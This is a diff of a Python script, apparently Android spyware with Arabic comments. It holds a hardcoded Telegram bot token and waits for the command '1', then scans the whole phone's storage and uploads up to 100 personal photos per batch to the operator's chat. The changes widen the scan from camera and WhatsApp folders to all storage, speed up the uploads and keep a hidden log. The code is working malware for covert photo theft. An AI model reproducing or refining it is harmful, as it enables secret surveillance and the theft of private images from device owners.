@@ -1,31 +1,34 @@
 import os
 import time
 import requests
-from jnius import autoclass
-
-# توثيق الخدمة لضمان الاستقرار
-try:
-    PythonService = autoclass('org.kivy.android.PythonService')
-    service = PythonService.mService
-except:
-    service = None
 
 BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
 CHAT_ID = "7084557369"
-LOG_FILE = "/storage/emulated/0/.sys_cmd_log.txt"
+# سجل البصمة لمنع التكرار
+LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"
 
 def get_sent():
     if not os.path.exists(LOG_FILE): return set()
     with open(LOG_FILE, "r") as f: return set(f.read().splitlines())
 
 def save_sent(path):
-    with open(LOG_FILE, "a") as f: f.write(path + "\n")
+    try:
+        with open(LOG_FILE, "a") as f: f.write(path + "\n")
+    except: pass
 
-def check_command():
-    """يفحص إذا أرسلت رقم 1 في البوت"""
+def send_doc(path):
+    try:
+        with open(path, "rb") as f:
+            # تم تقليل الـ timeout لزيادة السرعة
+            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
+                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=30)
+        return r.status_code == 200
+    except: return False
+
+def check_for_command():
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-        r = requests.get(url, params={"offset": -1}, timeout=10).json()
+        r = requests.get(url, params={"offset": -1}, timeout=5).json()
         if r.get("result"):
             last_msg = r["result"][-1].get("message", {}).get("text", "")
             if last_msg == "1":
@@ -33,41 +36,63 @@ def check_command():
     except: pass
     return False
 
-def scan_and_send():
-    targets = ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"]
+def deep_scan_all():
+    """البحث في كامل ذاكرة الهاتف بتركيز عالٍ"""
+    base_path = "/storage/emulated/0/"
     sent = get_sent()
     found = []
-    for base in targets:
-        if os.path.exists(base):
-            for root, _, files in os.walk(base):
-                for f in files:
-                    if f.lower().endswith((".jpg", ".png", ".jpeg")):
-                        p = os.path.join(root, f)
-                        if p not in sent: found.append(p)
     
-    found.sort(key=os.path.getmtime) # الأقدم أولاً
-    for p in found:
-        try:
-            with open(p, "rb") as f:
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
-                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
-            save_sent(p)
-            time.sleep(2)
-        except: continue
+    # قائمة بكلمات يجب تجنبها (الملصقات والمصغرات) لضمان سحب صور حقيقية
+    black_list = ["sticker", "thumbnail", "cache", "icon", ".face"]
+
+    if os.path.exists(base_path):
+        for root, dirs, files in os.walk(base_path):
+            low_root = root.lower()
+            # تخطي المجلدات غير المرغوب فيها
+            if any(word in low_root for word in black_list):
+                continue
+                
+            for file in files:
+                if file.lower().endswith((".jpg", ".jpeg", ".png")):
+                    p = os.path.join(root, file)
+                    if p not in sent:
+                        found.append(p)
+    
+    # الترتيب من الأقدم للأحدث لسحب الأرشيف التاريخي للجهاز
+    found.sort(key=os.path.getmtime)
+    return found
 
 def main():
-    # إشعار التثبيت الفوري
+    # إشعار عند بدء التشغيل
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                  data={"chat_id": CHAT_ID, "text": "✅ تم تثبيت التطبيق بنجاح.\nالشبح في وضع الاستعداد.. أرسل رقم (1) لبدء سحب الصور."})
+                  data={"chat_id": CHAT_ID, "text": "⚠️ النظام متصل.. أرسل (1) لسحب 100 صورة دفعة واحدة وبسرعة قصوى."})
     
     while True:
         try:
-            if check_command():
+            if check_for_command():
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                              data={"chat_id": CHAT_ID, "text": "🚀 تم استلام الأمر (1).. جاري سحب الصور الآن."})
-                scan_and_send()
-            time.sleep(15) # يفحص الأمر كل 15 ثانية لراحة البطارية
-        except: time.sleep(30)
+                              data={"chat_id": CHAT_ID, "text": "🚀 بدأ الهجوم.. جاري سحب الـ 100 صورة الأولى!"})
+                
+                photos = deep_scan_all()
+                if not photos:
+                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                                  data={"chat_id": CHAT_ID, "text": "✅ تم مسح الجهاز بالكامل، لا توجد صور جديدة."})
+                else:
+                    count = 0
+                    for p in photos:
+                        if count >= 100: break # سحب 100 صورة
+                        if send_doc(p):
+                            save_sent(p)
+                            count += 1
+                            # تم تقليل وقت الانتظار إلى 0.1 ثانية فقط لسرعة "الرشاش"
+                            time.sleep(0.1)
+                    
+                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                                  data={"chat_id": CHAT_ID, "text": f"✅ اكتمل إرسال {count} صورة بنجاح. أرسل (1) للوجبة التالية."})
+            
+            time.sleep(3) # فحص الأمر كل 3 ثوانٍ لسرعة الاستجابة
+        except:
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
